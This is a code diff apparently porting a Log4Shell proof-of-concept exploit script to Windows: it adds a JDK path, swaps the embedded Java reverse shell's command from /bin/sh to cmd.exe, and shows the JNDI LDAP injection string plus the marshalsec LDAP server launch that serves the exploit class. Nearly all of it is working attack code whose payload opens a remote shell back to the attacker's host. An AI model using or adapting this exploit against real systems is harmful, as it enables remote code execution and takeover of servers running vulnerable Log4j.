@@ -7,6 +7,8 @@ import threading
 
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
+JAVA_DIR = R"C:\Program Files\Java\jdk-13.0.1\bin"
+
 init(autoreset=True)
 
 def listToString(s):
@@ -34,7 +36,7 @@ public class Exploit {
   public Exploit() throws Exception {
     String host="%s";
     int port=%s;
-    String cmd="/bin/sh";
+    String cmd="cmd.exe";
     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
     Socket s=new Socket(host,port);
     InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
@@ -89,7 +91,7 @@ public class Exploit {
 
 
 def checkJavaAvailible():
-  javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+  javaver = subprocess.call([RF"{JAVA_DIR}\java.exe", '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
   if(javaver != 0):
     print(Fore.RED + '[-] Java is not installed inside the repository ')
     sys.exit()
@@ -99,10 +101,10 @@ def createLdapServer(userip, lport):
   sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
   print(Fore.GREEN +"[+] Send me: "+sendme+"\n")
 
-  subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])
+  subprocess.run([RF"{JAVA_DIR}\javac.exe", "Exploit.java"])
 
   url = "http://{}:{}/#Exploit".format(userip, lport)
-  subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
+  subprocess.run([RF"{JAVA_DIR}\java.exe", "-cp",
                  "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])
  
 
